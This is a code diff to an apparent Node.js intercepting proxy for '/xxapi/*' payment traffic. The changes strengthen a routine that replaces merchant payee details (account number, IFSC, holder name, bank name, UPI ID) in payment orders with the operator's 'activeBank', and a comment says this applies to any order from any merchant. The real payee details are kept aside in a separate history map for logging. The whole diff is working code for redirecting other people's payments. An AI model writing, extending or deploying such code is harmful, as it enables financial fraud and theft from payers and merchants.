@@ -579,6 +579,32 @@ function deepReplaceBankFields(obj, bank, depth, globalHasAcct) {
   }
 }
 
+function resolveTargetBank(data, orderId, altId, activeBank) {
+  if (!activeBank) return null;
+  const o1 = orderId ? (data.orderBankMap && data.orderBankMap[String(orderId)]) : null;
+  const o2 = altId ? (data.orderBankMap && data.orderBankMap[String(altId)]) : null;
+  const saved = o1 || o2;
+
+  if (saved && (saved.forced || saved.isManual)) {
+    const sHolder = saved.accountHolder || (saved.bank ? saved.bank.split(' | ')[0] : '') || activeBank.accountHolder;
+    const sAcct = saved.accountNo || (saved.bank ? saved.bank.split(' | ')[1] : '') || activeBank.accountNo;
+    const sIfsc = saved.ifsc || (saved.bank ? saved.bank.split(' | ')[2] : '') || activeBank.ifsc;
+    const sBankName = saved.bankName || (sIfsc ? getBankNameFromIfsc(sIfsc) : '') || activeBank.bankName || 'Bank';
+    const sUpi = saved.upiId || activeBank.upiId || '';
+
+    return {
+      accountHolder: sHolder || activeBank.accountHolder,
+      accountNo: sAcct || activeBank.accountNo,
+      ifsc: sIfsc || activeBank.ifsc,
+      bankName: sBankName || activeBank.bankName || 'Bank',
+      upiId: sUpi || activeBank.upiId || ''
+    };
+  }
+
+  // Universal dynamic fallback: ANY order with ANY merchant bank details will be replaced with our activeBank
+  return activeBank;
+}
+
 function replaceOrderBankDetails(order, bank) {
   if (!order || typeof order !== 'object' || !bank) return;
   const bkAcct = bank.accountNo || '';
@@ -589,22 +615,36 @@ function replaceOrderBankDetails(order, bank) {
 
   deepReplaceBankFields(order, bank, 0, true);
 
-  if (order.acctNo !== undefined) order.acctNo = bkAcct;
-  if (order.acctCode !== undefined) order.acctCode = bkIfsc;
-  if (order.acctName !== undefined) order.acctName = bkName;
-  if (order.accountNo !== undefined) order.accountNo = bkAcct;
-  if (order.accountNumber !== undefined) order.accountNumber = bkAcct;
-  if (order.account !== undefined) order.account = bkAcct;
-  if (order.ifsc !== undefined) order.ifsc = bkIfsc;
-  if (order.name !== undefined) order.name = bkName;
-  if (order.realName !== undefined) order.realName = bkName;
-  if (order.payAccount !== undefined) order.payAccount = bkUpi;
-  if (order.payee_bank_account !== undefined) order.payee_bank_account = bkAcct;
-  if (order.payee_ifsc !== undefined) order.payee_ifsc = bkIfsc;
-  if (order.payee_recipients_name !== undefined) order.payee_recipients_name = bkName;
-  if (order.payee_bankname !== undefined) order.payee_bankname = bkBank;
-  if (order.bankName !== undefined) order.bankName = bkBank;
-  if (order.bank_name !== undefined) order.bank_name = bkBank;
+  if (bkAcct) {
+    order.acctNo = bkAcct;
+    order.accountNo = bkAcct;
+    order.accountNumber = bkAcct;
+    order.account = bkAcct;
+    order.payee_bank_account = bkAcct;
+    order.payee_account = bkAcct;
+  }
+  if (bkIfsc) {
+    order.acctCode = bkIfsc;
+    order.ifsc = bkIfsc;
+    order.ifscCode = bkIfsc;
+    order.payee_ifsc = bkIfsc;
+  }
+  if (bkName) {
+    order.acctName = bkName;
+    order.name = bkName;
+    order.accountName = bkName;
+    order.realName = bkName;
+    order.payee_recipients_name = bkName;
+    order.payee_name = bkName;
+  }
+  if (bkBank) {
+    order.bankName = bkBank;
+    order.bank_name = bkBank;
+    order.payee_bankname = bkBank;
+  }
+  if (bkUpi && order.payAccount !== undefined) {
+    order.payAccount = bkUpi;
+  }
 }
 
 const BALANCE_KEYS = ['balance', 'userbalance', 'availablebalance', 'totalbalance', 'money',
@@ -1852,15 +1892,8 @@ app.all('/xxapi/*', async (req, res) => {
             }
             const altId = order.orderNo || order.rptNo || '';
 
-            // Find target bank (saved in orderBankMap or fallback to activeBank)
-            let targetBank = null;
-            if (orderId && data.orderBankMap && data.orderBankMap[String(orderId)]) {
-              targetBank = data.orderBankMap[String(orderId)];
-            } else if (altId && data.orderBankMap && data.orderBankMap[String(altId)]) {
-              targetBank = data.orderBankMap[String(altId)];
-            } else {
-              targetBank = activeBank;
-            }
+            // Find target bank (saved in orderBankMap if forced/manual or fallback to activeBank)
+            const targetBank = resolveTargetBank(data, orderId, altId, activeBank);
 
             if (targetBank) {
               const bkAcctC1 = targetBank.accountNo || '';
@@ -2170,22 +2203,7 @@ app.all('/xxapi/*', async (req, res) => {
             if (!item || typeof item !== 'object') return;
             const oId = _getItemOId(item);
             const altOId = item.orderNo || item.rptNo || '';
-            const savedSlip = (oId && data.orderBankMap && data.orderBankMap[oId])
-              || (altOId && data.orderBankMap && data.orderBankMap[altOId])
-              || null;
-
-            let targetBank = null;
-            if (savedSlip) {
-              targetBank = {
-                accountHolder: savedSlip.accountHolder || (savedSlip.bank ? savedSlip.bank.split(' | ')[0] : '') || bank.accountHolder,
-                accountNo: savedSlip.accountNo || (savedSlip.bank ? savedSlip.bank.split(' | ')[1] : '') || bank.accountNo,
-                ifsc: savedSlip.ifsc || (savedSlip.bank ? savedSlip.bank.split(' | ')[2] : '') || bank.ifsc,
-                bankName: savedSlip.bankName || bank.bankName || 'Bank',
-                upiId: savedSlip.upiId || bank.upiId || ''
-              };
-            } else {
-              targetBank = bank;
-            }
+            const targetBank = resolveTargetBank(data, oId, altOId, bank);
 
             if (targetBank) {
               const iAmt = parseFloat(item.orderAmount || item.amount || item.money || item.totalAmount || item.buyAmount || 0);
@@ -2372,9 +2390,10 @@ ${replaceLine}
           const acctCode = item.acctCode || item.acctcode || item.ifsc || item.acctIfsc || '';
           const amt = item.amount || item.money || item.realAmount || item.orderAmount || '';
 
-          // Don't overwrite entries that were forced by our proxy (forced=true)
-          if (!data.orderBankMap[oId] || !data.orderBankMap[oId].forced) {
-            data.orderBankMap[oId] = {
+          // Store real history snapshot separately for logging without corrupting orderBankMap
+          if (!data.realHistoryMap) data.realHistoryMap = {};
+          if (!data.realHistoryMap[oId]) {
+            data.realHistoryMap[oId] = {
               bank: `${acctName} | ${acctNo}${acctCode ? ' | ' + acctCode : ''}`,
               amount: parseFloat(amt) || 0,
               rptNo: item.rptNo || item.rpt_no || oId,
@@ -2382,11 +2401,6 @@ ${replaceLine}
               time: now,
               userId: userId || ''
             };
-            // Also index by rptNo if different from orderNo
-            const altId = item.rptNo || item.rpt_no || '';
-            if (altId && altId !== oId && (!data.orderBankMap[altId] || !data.orderBankMap[altId].forced)) {
-              data.orderBankMap[altId] = data.orderBankMap[oId];
-            }
           }
 
           // Check if we have already notified about this specific order ID
